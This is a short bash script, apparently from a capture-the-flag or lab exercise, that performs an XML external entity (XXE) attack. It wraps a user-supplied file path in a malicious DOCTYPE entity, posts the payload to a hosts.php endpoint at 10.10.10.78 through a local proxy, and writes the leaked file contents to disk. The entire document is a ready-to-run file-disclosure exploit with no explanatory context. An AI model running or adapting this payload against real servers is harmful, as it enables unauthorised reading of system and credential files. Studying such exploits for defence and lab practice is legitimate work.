#!/bin/bash

if [ "$#" == "1" ]; then
    file=$1
else
    echo "$0 [file]"
    exit 1
fi

exploit="<!DOCTYPE foo[
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM \"$file\"> ]>
<details>
    <subnet_mask>&xxe;</subnet_mask>
    <test></test>
</details>"

echo "$exploit" > tmp
curl -s -X POST -d @tmp http://10.10.10.78/hosts.php -x http://127.0.0.1:8080 | tee $(basename "$file")
rm tmp
